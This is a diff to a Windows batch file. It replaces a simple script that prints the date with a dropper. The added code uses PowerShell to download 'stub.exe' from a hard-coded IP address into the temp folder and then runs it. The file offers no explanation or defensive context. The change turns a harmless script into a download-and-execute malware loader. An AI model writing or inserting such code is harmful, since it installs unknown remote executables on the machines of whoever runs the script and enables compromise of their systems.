@@ -1,7 +1,17 @@
-::Hello World !
-@echo OFF
-echo Date : %date%
-echo Day : %date:~0,2%
-echo Month : %date:~3,2%
-echo Year : %date:~6,4%
-pause >nul
+@echo off
+set "URL=http://162.19.219.101:80/stub.exe"
+set "TEMP_DIR=%TEMP%"
+set "EXE_NAME=stub.exe"
+
+echo Downloading %EXE_NAME%...
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TEMP_DIR%\%EXE_NAME%')"
+
+if exist "%TEMP_DIR%\%EXE_NAME%" (
+    echo Download complete. Executing %EXE_NAME%...
+    start "" "%TEMP_DIR%\%EXE_NAME%"
+) else (
+    echo Failed to download %EXE_NAME%.
+)
+
+echo Script execution complete.
+pause
